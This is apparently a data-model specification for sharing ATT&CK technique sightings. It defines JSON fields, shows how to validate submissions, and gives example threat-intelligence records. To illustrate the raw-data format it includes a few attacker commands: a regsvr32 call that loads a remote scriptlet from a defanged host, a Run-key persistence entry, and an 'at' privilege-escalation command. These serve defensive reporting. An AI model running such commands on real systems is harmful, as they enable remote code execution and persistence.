## Data Model Format Definitions

All formats are JSON and consist of either a list of entries or a single entry. Please e-mail <ctid@mitre-engenuity.org> with any questions or suggestions.

Fields in **bold** and identified by the `Required` column are required, all other fields are optional. For the "Timestamp" datatype, please use RFC 3339 timestamps in UTC time.
Most importantly, please do not include any information beyond that specified in the format below. In particular, we do not want to collect sensitive victim information or other PII.

- [Data Model Format Definitions](#data-model-format-definitions)
- [Terms Used](#terms-used)
- [Sighting](#sighting)
- [Techniques](#techniques)
- [Handling Raw Data](#handling-raw-data)
  - [Formatting](#formatting)
  - [Validating](#validating)
    - [AJV](#ajv)
    - [Validation Examples](#validation-examples)
- [Data Examples](#data-examples)
  - [Simple Technique Sighting](#simple-technique-sighting)
  - [Technique Sighting with Attribution](#technique-sighting-with-attribution)
  - [Malware Blocked by Security Tool](#malware-blocked-by-security-tool)
  - [IOC Submission](#ioc-submission)

## Terms Used

- MUST -> Absolute requirement of the specification.
- SHOULD -> Recommended but not a requirement.

## Sighting

| Field              | Datatype       | Required                                                                     | Description                                                                                                                                                                                                                                                                                                                                                                                      |
| ------------------ | -------------- | ---------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **version**        | String         | yes                                                                          | Required version string for the data model. **MUST** be set to **`1.0`**.                                                                                                                                                                                                                                                                                                                         |
| **id**             | String         | yes                                                                          | Required ID for this event. **SHOULD** be in UUIDv4 format.                                                                                                                                                                                                                                                                   |
| **sighting_type**  | String         | yes                                                                          | Either "direct_technique", "direct_software", or "indirect_software". If direct_software or indirect_software, "software_name" field is required.                                                                                                                                                                                                                                                |
| **start_time**     | [Timestamp](https://tools.ietf.org/html/rfc3339#page-10)      | yes                                                                          | Time the activity started, in UTC. **MUST** be in [RFC 3339, section 5.6](https://datatracker.ietf.org/doc/html/rfc3339#section-5.6) **date-time** format. For example: `2018-11-13T20:20:39+00:00`.                                                                                                                                                                                                                                                                                          |
| end_time           | [Timestamp](https://tools.ietf.org/html/rfc3339#page-10)      | no                                                                           | Time the activity ended. **MUST** be in [RFC 3339, section 5.6](https://datatracker.ietf.org/doc/html/rfc3339#section-5.6) **date-time** format. For example: `2018-11-13T20:20:39+00:00`.                                                                                                                                                                                                                                                                                            |
| **detection_type** | String         | yes                                                                          | **MUST** be one of the following values: `human_validated`, `machine_validated`, `raw`. Use `human_validated` when a human analyst has reviewed the detection and determined it to not be a false positive. Use `machine_validated` when a machine has performed an analysis on it, such as a sandbox. Use `raw` when no validation has occurred.                                                                                        |
| **techniques**     | List           | yes                                                                          | List of techniques that were observed. The techniques field has its own schema, [table](#technique), below for reference.                                                                                                                                                                                                                                                  |
| **hash**           | String         | yes, if `sighting_type` == `direct_software` OR `indirect_software`, else no | **Required if using direct_software or indirect_software sighting type.** Value **MUST** be MD5, SHA-1, or SHA-256 hash of the software.                                                                                                                                                                                                                                                                       |
| software_name      | String         | no                                                                           | The malicious software that was observed. Malicious software that was observed. **SHOULD** ideally be an exact name from the list of [Software Names or Associated Software](https://attack.mitre.org/software/) already in ATT&CK.                                                                                                                                                                                                   |
| sector             | List\[String\] | no                                                                           | **SHOULD** be [NAICS](https://www.census.gov/naics/?58967?yearbck=2017) code for the sector(s) in which the victim belongs, such as `healthcare`.                                                                                                                                                                                                                                                                                |
| country            | String         | no                                                                           | MUST The ISO country code of the victim. For example, `us`.                                                                                                                                                                                                                                                                                                                                                              |
| region             | String         | no                                                                           | The [IANA Regional Internet Registry](https://www.iana.org/numbers) code of the victim, e.g. `ARIN`.                                                                                                                                                                                                                                                                                               |
| size               | String         | no                                                                           | Approximate size, in number of employees, of the victim. Examples are "100", "2500", "3000+".                                                                                                                                                                                                                                                                            |
| attribution_type   | String         | no                                                                           | **MUST** be one of the following values: `group`, `incident`, or `software`.                                                                                                                                                                                                                                                                                                                                                       |
| attribution        | String         | no                                                                           | The name of the threat group, incident/campaign, or malicious software associated to this activity. This should ideally be an exact name from the list of [Group Names or Associated Groups](https://attack.mitre.org/groups/) already in ATT&CK for threat groups, and of [Software Names or Associated Software](https://attack.mitre.org/software/) already in ATT&CK for malicious software. |
| detection_source   | String         | no                                                                           | **MUST** be one of the following values: `host_based` or `network_based`.                                                                                                                                                                                                                                                                                                                                                          |
| privilege_level    | String         | no                                                                           | **MUST** be on of the following values: "system", "admin", "user", "none".                                                                                                                                                                                                                                                                                                                                                     |

## Techniques

| Field            | Datatype     | Description |                                                                                                                                                                                                                                                                                                                      |
| ---------------- | ------------ | ----------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **technique_id** | String       | yes         | The ATT&CK ID (e.g., "T1086") that was observed.                                                                                                                                                                                                                                                                     |
| platform         | String       | no          | The platform this technique was observed on. Please include the full name, edition, and version. E.g., "Windows 10 Enterprise", "Windows Server 2012 Standard", "MacOS 10.13.5", "Ubuntu 14.04".                                                                                                                     |
| **start_time**   | [Timestamp](https://tools.ietf.org/html/rfc3339#page-10) | yes         | The time that this specific technique was observed.                                                                                                                                                                                                                                                                  |
| end_time         | [Timestamp](https://tools.ietf.org/html/rfc3339#page-10) | no          | The time that this specific technique sighting ended.                                                                                                                                                                                                                                                                |
| tactic           | String       | no          | The name of the tactic that this technique was used to enable. For example, a sighting of Scheduled Task could indicate whether it was used for privilege escalation or for persistence. Format should be the tactic name as referenced in ATT&CK navigator layer file format (lowercase dashed, credential-access). |
| raw_data         | List\[data\] | no          | The list of raw data, if sharable, to support this observation. Could be command lines, event records, etc. Format this as described below.                                                                                                                                                                          |

## Handling Raw Data

### Formatting

Each object in the list of raw data should consist of an object from the [CAR data model](https://car.mitre.org/data_model/) in the form of "object.action": {"field": "value"}.

For example:

**Command Line**:

```json
"process.create": {"command_line": "regsvr32.exe /i:hxxp://lolbad.com scrobj.dll"}
```

**Registry Key**:

```json
"registry.add": {
    "hive": "HKEY_CURRENT_USER",
    "key": "\Software\Microsoft\Windows\CurrentVersion\Run",
    "value": "bad.exe"
}
```

More complete examples are also below. If something isn't expressible in the CAR data model as-is, just make up an object and action that makes sense to you and we'll figure it out.

### Validating

#### AJV

AJV, or Another JSON Validator, is a useful tool to validate your data against the JSON schema.

To install, run the following commands:

- `npm install -g ajv-cli ajv-formats`

#### Validation Examples

- Validate a single file named `MY_DATA_FILE.json`
  - `ajv --strict=false validate -s src/validator/sighting_schema.json -d MY_DATA_FILE.json -c ajv-formats`
- Test a directory of files against the schema
  - `ajv --strict=false test -s src/validator/sighting_schema.json -d "*.json" -c ajv-formats --valid`
- Test included sample data in the repository (sanity check to ensure `ajv` is installed properly)
  - `ajv --strict=false test -s src/validator/sighting_schema.json -d src/validator/sighting.json -c ajv-formats --valid`
  - Should return output similar to `src/validator/sighting.json passed test`

## Data Examples

### Simple Technique Sighting

A managed service provider monitors sensor data across its customer base. During that monitoring, an analytic flags a Sysmon process event that indicates a scheduled task is being created using "at".

```json
{
  "version": "1.0",
  "id": "DT-1234",
  "sighting_type": "direct_technique",
  "start_time": "2019-01-01T08:12:00Z",
  "end_time": "2019-01-01T08:12:00Z",
  "detection_type": "human_validated",
  "techniques": [
    {
      "technique_id": "T1088",
      "start_time": "2019-01-01T08:12:00Z",
      "end_time": "2019-01-01T08:12:00Z",
      "platform": "Windows 10",
      "raw_data": [
        { "process.create": {"command_line": "at 13:30 /interactive cmd"} }
      ]
    }
  ]
}
```

### Technique Sighting with Attribution

An ISAC collects, anonymizes, and redistributes sightings from its members. While it doesn’t receive the raw data, it does have demographic and (sometimes) attribution information.

```json
{
  "version": "1.0",
  "id": "1000",
  "sighting_type": "direct_technique",
  "start_time": "2019-01-01T08:12:00Z",
  "end_time": "2019-01-01T08:12:00Z",
  "detection_type": "human_validated",
  "sectors": ["finance"],
  "attribution_type": "group",
  "attribution": "FIN7",
  "techniques": [
    {
      "technique_id": "T1003",
      "start_time": "2019-01-01T08:12:00Z",
      "end_time": "2019-01-01T08:12:00Z",
      "platform": "Windows 10 Enterprise"
    }
  ]
}
```

### Malware Blocked by Security Tool

A large end-user organization is running an anti-malware service that blocks execution of a Mac malware already in ATT&CK.

```json
{
  "version": "1.0",
  "id": "32",
  "sighting_type": "direct_software",
  "start_time": "2019-01-01T08:12:00Z",
  "end_time": "2019-01-01T08:12:00Z",
  "detection_type": "raw",
  "sectors": ["healthcare"],
  "hash": "<some hash>",
  "software_name": "MacSpy"
}
```

### IOC Submission

A TIP vendor submits a set of IOCs that have been identified with ATT&CK techniques.

```json
{
  "version": "1.0",
  "id": "32",
  "sighting_type": "indirect_software",
  "start_time": "2019-01-01T08:12:00Z",
  "end_time": "2019-01-01T08:12:00Z",
  "sectors": ["healthcare"],
  "hash": "<some hash>",
  "software_name": "RemCom"
} 
```
